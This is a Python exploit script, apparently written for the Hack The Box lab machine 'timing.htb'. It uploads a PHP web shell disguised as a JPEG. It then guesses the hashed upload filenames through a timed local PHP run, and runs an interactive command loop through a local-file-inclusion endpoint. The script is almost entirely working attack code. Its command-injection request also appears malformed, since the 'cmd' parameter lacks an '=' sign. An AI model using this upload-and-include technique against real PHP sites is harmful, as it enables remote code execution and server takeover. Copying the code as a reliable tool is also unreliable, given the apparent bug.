import requests
import os
import time
import threading

url = "http://timing.htb"

def upload_post():
	url = "http://timing.htb:80/upload.php"
	cookies = {"PHPSESSID": "s4fd94a25erqq1ctja065vfs1s"}
	headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------358100878512268049331587005052", "Origin": "http://timing.htb", "Connection": "close", "Referer": "http://timing.htb/avatar_uploader.php"}
	data = "-----------------------------358100878512268049331587005052\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"exploit.jpg\"\r\nContent-Type: txt/php\r\n\r\n<?php system($_GET['cmd']); ?>\n\r\n-----------------------------358100878512268049331587005052--\r\n"
	r=requests.post(url = url, headers = headers, cookies = cookies, data = data)

def fname():
	print("Executing...")
	for i in range(15):
		os.system("php -f fname.php >> output.txt")
		if(i==6):
			threading.Thread(target=upload_post).start()
		time.sleep(1)

def response(filename):
	TARGET = "http://timing.htb/images/uploads/"
	r = requests.get(TARGET+str(filename))
	return r.status_code

def injector(filename, cmd):
	TARGET = "http://timing.htb/image.php?img=images/uploads/"
	r = requests.get(TARGET+filename+"&cmd"+cmd)
	print(r.text)

if __name__ == "__main__":

	fname()

	hash_names=[]
	f = open("output.txt", "r")
	for i in range(15):
		hash_names.append(f.readline().strip("\n"))
	f.close()

	for filename in hash_names:
		if str(response(filename))=="200":
			os.system("clear")
			print("Success!")
			while(1):
				cmd=input("> ")
				injector(filename, cmd)
				if cmd=="exit":
					break
